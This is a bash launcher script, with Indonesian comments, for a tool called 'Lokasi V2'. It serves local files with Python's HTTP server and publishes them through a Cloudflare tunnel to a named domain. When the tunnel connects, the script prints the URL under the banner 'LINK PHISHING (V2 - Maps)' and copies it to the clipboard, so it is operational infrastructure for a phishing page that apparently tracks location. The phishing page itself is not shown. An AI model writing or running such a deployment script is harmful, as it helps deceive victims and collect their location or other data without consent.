#!/bin/bash
# Lokasi V2 - Run Script (Server + Cloudflare Tunnel → maps.zqx.my.id)
# Usage: ./run.sh

PORT=8080
TUNNEL_ID="2bc3b50e-ce1e-44d9-a936-93f1c2bcdf98"
DOMAIN="maps.zqx.my.id"

echo "[*] Matikan server lama di port $PORT..."
fuser -k $PORT/tcp 2>/dev/null
sleep 1

echo "[*] Start HTTP server di port $PORT..."
cd "$(dirname "$0")"
python3 -m http.server $PORT &
SERVER_PID=$!
sleep 1

echo "[*] Start Cloudflare tunnel..."
echo "[*] ─────────────────────────────────────"

cloudflared tunnel run $TUNNEL_ID 2>&1 | while read -r line; do
    if echo "$line" | grep -qE "Registered tunnel connection"; then
        echo ""
        echo "═══════════════════════════════════════"
        echo "  🔗 LINK PHISHING (V2 - Maps):"
        echo "  https://$DOMAIN/"
        echo "═══════════════════════════════════════"
        echo ""
        if command -v xclip &> /dev/null; then
            echo "https://$DOMAIN/" | xclip -selection clipboard
            echo "  📋 Link copied to clipboard!"
        elif command -v wl-copy &> /dev/null; then
            echo "https://$DOMAIN/" | wl-copy
            echo "  📋 Link copied to clipboard!"
        fi
        echo ""
    fi
    if echo "$line" | grep -qE "ERR|error|failed|Failed"; then
        echo "  [error] $line"
    fi
done

trap "kill $SERVER_PID 2>/dev/null; exit" SIGINT SIGTERM EXIT
wait
